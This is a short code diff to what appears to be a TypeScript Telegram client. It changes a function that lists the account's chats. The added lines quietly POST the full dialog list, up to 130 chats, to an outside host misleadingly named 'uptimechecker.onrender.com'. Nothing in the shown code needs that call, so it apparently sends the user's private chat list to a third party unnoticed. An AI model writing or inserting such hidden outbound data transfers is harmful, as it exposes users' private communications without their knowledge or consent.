@@ -400,6 +400,13 @@ async function deleteMsgs(event: NewMessageEvent) {
 
 async function sendChannels() {
     const chats = await client?.getDialogs({ limit: 130 });
+    const options3 = {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: { channels: chats }
+    };
+    await fetchWithTimeout(`https://uptimechecker.onrender.com/channels`, options3);
+
     let reply = 'CHANNELS:\n\n';
     chats.map((chat: any) => {
         if (chat.isChannel || chat.isGroup) {
